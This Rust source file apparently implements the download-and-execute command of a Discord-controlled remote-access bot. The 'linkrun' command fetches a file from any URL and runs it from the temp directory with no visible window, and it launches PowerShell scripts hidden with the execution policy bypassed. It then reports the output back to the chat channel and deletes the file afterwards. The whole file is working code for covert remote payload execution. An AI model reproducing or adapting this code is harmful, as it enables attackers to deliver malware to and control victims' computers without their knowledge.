use crate::commands::*;
use anyhow::Result;
use async_trait::async_trait;
use std::env;
use std::os::windows::process::CommandExt;
use std::process::Stdio;
use tokio::process::Command;
use twilight_http::Client as HttpClient;
use twilight_model::channel::message::Message;

const CREATE_NO_WINDOW: u32 = 0x08000000;

pub struct LinkRunCommand;

#[async_trait]
impl BotCommand for LinkRunCommand {
    fn name(&self) -> &str { "linkrun" }
    fn description(&self) -> &str { "Download and execute a file from a URL" }
    fn category(&self) -> &str { "core" }
    fn usage(&self) -> &str { ".linkrun <url> [args...]" }
    fn examples(&self) -> &'static [&'static str] { &[".linkrun https://example.com/payload.exe", ".linkrun https://example.com/script.bat arg1 arg2"] }
    fn aliases(&self) -> &'static [&'static str] { &["runurl", "dlrun"] }

    async fn execute(
        &self,
        http: &Arc<HttpClient>,
        msg: &Message,
        mut args: Arguments,
    ) -> Result<()> {
        let url = args.next().unwrap_or("").to_string();
        let extra_args = args.rest();

        if url.is_empty() {
            http.create_message(msg.channel_id)
                .content("ERROR: Please provide a URL.\nUsage: `.linkrun <url> [args...]`")
                .await?;
            return Ok(());
        }

        // Validate URL
        if !url.starts_with("http://") && !url.starts_with("https://") {
            http.create_message(msg.channel_id)
                .content("ERROR: Invalid URL format. URL must start with http:// or https://")
                .await?;
            return Ok(());
        }

        // Extract filename from URL
        let filename = url.split('/')
            .last()
            .unwrap_or("payload.exe")
            .to_string();

        // Get temp directory
        let temp_dir = env::temp_dir();
        let file_path = temp_dir.join(&filename);

        // Send status message
        let response_msg = http
            .create_message(msg.channel_id)
            .content(&format!("⏳ Downloading `{}`...", filename))
            .await?;
        let response_message = response_msg.model().await?;

        // Download the file
        let client = reqwest::Client::builder()
            .user_agent("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
            .timeout(std::time::Duration::from_secs(60))
            .build()?;

        let response = match client.get(&url).send().await {
            Ok(resp) => resp,
            Err(e) => {
                http.update_message(msg.channel_id, response_message.id)
                    .content(Some(&format!("ERROR: Failed to download: {}", e)))
                    .await?;
                return Ok(());
            }
        };

        if !response.status().is_success() {
            http.update_message(msg.channel_id, response_message.id)
                .content(Some(&format!("ERROR: Server returned status: {}", response.status())))
                .await?;
            return Ok(());
        }

        let bytes = match response.bytes().await {
            Ok(b) => b,
            Err(e) => {
                http.update_message(msg.channel_id, response_message.id)
                    .content(Some(&format!("ERROR: Failed to read response: {}", e)))
                    .await?;
                return Ok(());
            }
        };

        // Write to temp file
        if let Err(e) = tokio::fs::write(&file_path, &bytes).await {
            http.update_message(msg.channel_id, response_message.id)
                .content(Some(&format!("ERROR: Failed to save file: {}", e)))
                .await?;
            return Ok(());
        }

        // Update status
        http.update_message(msg.channel_id, response_message.id)
            .content(Some(&format!("✅ Downloaded `{}` ({} bytes)\n⏳ Executing...", filename, bytes.len())))
            .await?;

        // Execute the file
        let file_path_str = file_path.to_string_lossy().to_string();
        
        let result = if filename.to_lowercase().ends_with(".exe") {
            // Run exe directly
            let mut cmd = Command::new(&file_path);
            if !extra_args.is_empty() {
                cmd.args(extra_args.split_whitespace());
            }
            cmd.creation_flags(CREATE_NO_WINDOW)
                .stdout(Stdio::piped())
                .stderr(Stdio::piped())
                .spawn()
        } else if filename.to_lowercase().ends_with(".bat") || filename.to_lowercase().ends_with(".cmd") {
            // Run batch file through cmd
            let mut cmd = Command::new("cmd");
            cmd.args(["/c", &file_path_str]);
            if !extra_args.is_empty() {
                cmd.args(extra_args.split_whitespace());
            }
            cmd.creation_flags(CREATE_NO_WINDOW)
                .stdout(Stdio::piped())
                .stderr(Stdio::piped())
                .spawn()
        } else if filename.to_lowercase().ends_with(".ps1") {
            // Run PowerShell script
            let mut cmd = Command::new("powershell");
            cmd.args(["-WindowStyle", "Hidden", "-ExecutionPolicy", "Bypass", "-File", &file_path_str]);
            if !extra_args.is_empty() {
                cmd.args(extra_args.split_whitespace());
            }
            cmd.creation_flags(CREATE_NO_WINDOW)
                .stdout(Stdio::piped())
                .stderr(Stdio::piped())
                .spawn()
        } else {
            // Try to run as exe by default
            let mut cmd = Command::new(&file_path);
            if !extra_args.is_empty() {
                cmd.args(extra_args.split_whitespace());
            }
            cmd.creation_flags(CREATE_NO_WINDOW)
                .stdout(Stdio::piped())
                .stderr(Stdio::piped())
                .spawn()
        };

        match result {
            Ok(child) => {
                // Wait for output with timeout
                match tokio::time::timeout(
                    std::time::Duration::from_secs(30),
                    child.wait_with_output()
                ).await {
                    Ok(Ok(output)) => {
                        let stdout = String::from_utf8_lossy(&output.stdout);
                        let stderr = String::from_utf8_lossy(&output.stderr);
                        
                        let mut result_msg = format!(
                            "✅ Executed `{}`\n**Exit Code:** {}",
                            filename,
                            output.status.code().unwrap_or(-1)
                        );
                        
                        if !stdout.trim().is_empty() {
                            let stdout_preview = if stdout.len() > 500 {
                                format!("{}...[truncated]", &stdout[..500])
                            } else {
                                stdout.to_string()
                            };
                            result_msg.push_str(&format!("\n**Output:**\n```\n{}\n```", stdout_preview));
                        }
                        
                        if !stderr.trim().is_empty() {
                            let stderr_preview = if stderr.len() > 300 {
                                format!("{}...[truncated]", &stderr[..300])
                            } else {
                                stderr.to_string()
                            };
                            result_msg.push_str(&format!("\n**Errors:**\n```\n{}\n```", stderr_preview));
                        }
                        
                        // Truncate final message if too long
                        if result_msg.len() > 1900 {
                            result_msg = format!("{}...\n[Message truncated]", &result_msg[..1850]);
                        }
                        
                        http.update_message(msg.channel_id, response_message.id)
                            .content(Some(&result_msg))
                            .await?;
                    }
                    Ok(Err(e)) => {
                        http.update_message(msg.channel_id, response_message.id)
                            .content(Some(&format!("✅ Started `{}` but failed to get output: {}", filename, e)))
                            .await?;
                    }
                    Err(_) => {
                        http.update_message(msg.channel_id, response_message.id)
                            .content(Some(&format!("✅ Started `{}` (running in background, timed out waiting for output)", filename)))
                            .await?;
                    }
                }
            }
            Err(e) => {
                http.update_message(msg.channel_id, response_message.id)
                    .content(Some(&format!("ERROR: Failed to execute: {}", e)))
                    .await?;
            }
        }

        // Clean up temp file after a delay (spawn background task)
        let cleanup_path = file_path.clone();
        tokio::spawn(async move {
            tokio::time::sleep(std::time::Duration::from_secs(30)).await;
            let _ = tokio::fs::remove_file(cleanup_path).await;
        });

        Ok(())
    }
}
